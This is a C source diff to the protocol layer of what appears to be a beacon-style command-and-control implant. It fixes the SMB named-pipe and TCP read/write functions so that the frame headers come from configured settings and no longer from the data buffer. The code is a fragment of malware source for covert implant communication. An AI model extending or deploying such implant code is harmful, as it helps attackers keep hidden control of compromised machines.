@@ -3,6 +3,7 @@
 #include "protocol.h"
 
 #include "beacon.h"
+#include "settings.h"
 
 int ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 {
@@ -82,7 +83,7 @@ char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
 int ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
 {
 	int headerSize;
-	char* header = ProtocolHeaderGet(buffer, 0, &headerSize);
+	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, 0, &headerSize);
 	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
 	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
 		return -1;
@@ -97,7 +98,7 @@ int ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
 int ProtocolTcpRead(PROTOCOL* protocol, char* buffer, int length)
 {
 	int headerSize;
-	char* header = ProtocolHeaderGet(buffer, 0, &headerSize);
+	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, 0, &headerSize);
 	int totalHeaderRead = ProtocolTcpSocketRead(protocol->channel.socket, header, headerSize);
 	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
 		return -1;
@@ -112,7 +113,7 @@ int ProtocolTcpRead(PROTOCOL* protocol, char* buffer, int length)
 BOOL ProtocolTcpWrite(PROTOCOL* protocol, char* buffer, int length)
 {
 	int headerSize;
-	char* header = ProtocolHeaderGet(buffer, length, &headerSize);
+	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, length, &headerSize);
 	if (!ProtocolTcpSocketWrite(protocol->channel.socket, header, headerSize))
 		return FALSE;
 
@@ -122,7 +123,7 @@ BOOL ProtocolTcpWrite(PROTOCOL* protocol, char* buffer, int length)
 BOOL ProtocolSmbWrite(PROTOCOL* protocol, char* buffer, int length)
 {
 	int headerSize;
-	char* header = ProtocolHeaderGet(buffer, length, &headerSize);
+	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, length, &headerSize);
 	if (!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize))
 		return FALSE;
 
